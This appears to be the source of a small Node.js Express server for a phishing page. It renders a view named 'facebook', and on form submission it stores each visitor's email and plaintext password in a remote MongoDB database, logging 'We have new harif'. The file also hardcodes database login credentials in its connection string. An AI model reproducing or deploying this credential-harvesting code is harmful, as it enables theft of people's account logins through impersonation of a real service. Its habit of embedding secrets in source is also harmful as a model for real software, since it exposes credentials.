const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const app = express();
const User = require('./user');

mongoose.connect('mongodb://harif:harif123@ds247001.mlab.com:47001/firstdb');

app.set('view engine', 'ejs');

var urlencodedParser = bodyParser.urlencoded({ extended: false });
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.render('facebook');
});

app.post('/', urlencodedParser, (req, res) => {
    res.render('facebook', {data: req.body});
    const harif = User({
        email: req.body.email,
        password: req.body.password
        }).save(function(err){
        if (err) throw err;
        console.log('We have new harif');
        });

});

app.listen(3000, console.log("Server run"));